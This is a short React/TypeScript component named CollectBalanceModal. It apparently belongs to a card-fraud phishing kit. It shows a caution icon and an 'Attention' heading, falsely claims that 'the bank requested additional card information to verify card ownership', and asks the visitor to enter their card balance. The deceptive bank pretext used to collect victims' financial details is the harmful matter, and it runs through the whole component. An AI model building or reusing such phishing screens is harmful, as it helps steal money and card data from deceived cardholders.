import Image from "../Image"
import CautionSign from "../../assets/caution-sign.svg"


const CollectBalanceModal: React.FC<Disclosure> = ({ handleSubmit, handleChange, errors, formData, loading }) => {

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      {errors && <p className='text-sm p-2 font-semibold text-center'>{errors}</p>}
      <p className="text-red-500 p-2 text-center font-semibold text-sm">{errors}</p>
      <Image src={CautionSign} alt="visa" className="w-28 bg-white p-1 rounded-full block mx-auto" />
      <h1 className='text-2xl font-semibold text-center text-black/80'>Attention</h1>

      <p className='text-sm text-center'>The bank requested additional card information to verify card ownership</p>

      <input onChange={handleChange} value={formData.balance} type="number" name="balance" id="" placeholder='Card balance' className='block mx-auto border p-3 rounded-md text-center placeholder:text-sm' />

      <div className="">
        <button disabled={loading} className={`focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0 bg-blue-500 text-white p-2 rounded-md block mx-auto shadow ${loading && "disabled:bg-blue-300"}`}>Continue</button>
      </div>
    </form>

  )
}

export default CollectBalanceModal